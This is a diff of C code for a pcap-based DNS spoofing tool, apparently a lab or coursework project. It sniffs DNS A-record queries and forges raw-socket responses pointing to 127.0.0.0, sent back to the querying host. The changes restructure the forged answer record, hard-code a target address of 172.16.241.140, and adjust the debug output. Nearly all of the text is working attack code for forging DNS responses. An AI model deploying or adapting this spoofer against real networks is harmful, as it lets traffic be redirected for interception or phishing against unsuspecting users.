@@ -57,15 +57,21 @@ struct dns_query {
 };
 
 struct dns_answer_data{
-	u_short type;
-	u_short class;
-	u_int ttl;    // 4 bytes for ttl
-	u_short rdlength;    // 2 bytes for rdlength. This will be set to 4.
-	u_int rdata; // 4 bytes for the IP address
+    u_short type;
+    u_short class;
+} __attribute__((packed, aligned(1)));
+
+struct dns_answer_data_1{
+    u_short name;
+    u_short type;
+    u_short class;
+    u_int ttl;    // 4 bytes for ttl
+    u_short rdlength;    // 2 bytes for rdlength. This will be set to 4.
+    u_int rdata; // 4 bytes for the IP address
 } __attribute__((packed, aligned(1)));
 
 struct dns_answer {
-	u_char name[10000];
+	u_char name[1000];
 	u_char separator;
 };
 
@@ -212,10 +218,14 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 		perror("socket() error\n");
 		return;
 	}
+	char *temp = "172.16.241.140";
+	struct in_addr addr;
 	source.sin_family = AF_INET;
 	source.sin_port = destination_port;
-	source.sin_addr.s_addr = destination_address;
-
+	inet_aton(temp, &addr);
+	source.sin_addr = addr;
+	printf("destination address = %lu and destination port = %d and ntohs %d\n", destination_address, \
+					destination_port, ntohs(destination_port));
 	// Inform the kernel do not fill up the headers' structure, we fabricated our own
 	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
 	{
@@ -224,7 +234,6 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 	}
 	if(sendto(sd, data, ip_length, 0, (struct sockaddr *)&source, sizeof(source)) < 0)
 	{
-		printf("data length is %d",  ip_length);
 		perror("sendto function() error\n");
 		return;
 	}
@@ -312,35 +321,42 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 
 				// Copying the null terminator for end of the domain and also copying the type and class fields
 				spoofed_dns_answer->separator = 0;
-
 				// Populating Answer Data
 				struct dns_answer_data* answer_data;
 				answer_data = (struct dns_answer_data*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
-									+ strlen(domain) + 1);
+						    + strlen(domain) + 1);
 				answer_data->type = query->type;
 				answer_data->class = query->class;
-				answer_data->ttl = htonl(600); // Keeping a 
-				answer_data->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
-				answer_data->rdata = htonl(2130706432);  // 127.0.0.0
+
+				
+				struct dns_answer_data_1* answer_data1;
+				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + sizeof(struct udphdr) + sizeof(struct dns_header) \
+						    + strlen(domain) + 1 + sizeof(struct dns_answer_data));
+				answer_data1->name = htons(49164);
+				answer_data1->type = query->type;
+				answer_data1->class = query->class;
+				answer_data1->ttl = htonl(600); // Keeping a 
+				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
+				answer_data1->rdata = htonl(2130706432);  // 127.0.0.0
 
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
 
 				// Checking for DNS queries only of the type A and class INTERNET
 				if(ntohs(query->type) != 1 || ntohs(query->class) != 1)
-					return;
+				    return;
 
 				if (stringExpression == NULL || ((*size_payload > 0) && strstr((char*)*payload, (char*)stringExpression))){
-					sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
-					sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
-					printf("%s\n", args);
-					print_payload(*payload, *size_payload);
-					printf("Response Start\n");
-					u_char *pay1 = (u_char*)datagram;
-					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
-						+ strlen(domain) + 1 + sizeof(struct dns_answer_data));
-					printf("Response End\n");
-					send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, ntohs(ip->ip_len));
+				    sprintf(args + strlen(args), " IP_length in hex %d", size_of_forged_dns_response);
+				    sprintf(args + strlen(args), " Payload (%d bytes):", *size_payload);
+				    printf("%s\n", args);
+				    print_payload(*payload, *size_payload);
+				    printf("Response Start\n");
+				    u_char *pay1 = (u_char*)datagram;
+				    print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
+					+ strlen(domain) + 1 + sizeof(struct dns_answer_data) + sizeof(struct dns_answer_data_1));
+				    printf("Response End\n");
+				    send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, size_of_forged_dns_response);
 				}
 			}
 			break;
@@ -368,15 +384,15 @@ got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_c
 	char buffer[26];
 	struct tm* tm_info;
 	tm_info = localtime(&header->ts.tv_sec);
-	strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
-	sprintf(args, "%s.%06u ", buffer, header->ts.tv_usec);
+	//strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);
+	//sprintf(args, "%s.%06u ", buffer, header->ts.tv_usec);
 
    	//ts_print(&(header->ts));
 
 	/* define ethernet header */
 	ethernet = (struct ether_header*)(packet);
 	
-	sprintf(args + strlen(args), "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_shost[0],
+	sprintf(args, "%02x:%02x:%02x:%02x:%02x:%02x", ethernet->ether_shost[0],
 									ethernet->ether_shost[1],
 									ethernet->ether_shost[2],
 									ethernet->ether_shost[3],
@@ -400,17 +416,7 @@ got_packet(u_char *stringExpression, const struct pcap_pkthdr *header, const u_c
 			sprintf(args + strlen(args), " length %u", header->len);
 			print_ip_packet(args, packet, &payload, &size_payload, stringExpression);
 			break;
-		case ETHERTYPE_ARP:
-			sprintf(args + strlen(args), "ARP ");
-			sprintf(args + strlen(args), "(0x%x)", ntohs(ethernet->ether_type));
-			sprintf(args + strlen(args), " length %u", header->len);
-			const struct arphdr *arpheader = NULL;
-			arpheader = (struct arphdr *)(packet+14); /* Point to the ARP header */ 
-			printf("%s\n", args);
-			break;
 		default:
-			sprintf(args + strlen(args)," OTHER");
-			printf("%s\n", args);
 			break;
 	}
 	/*
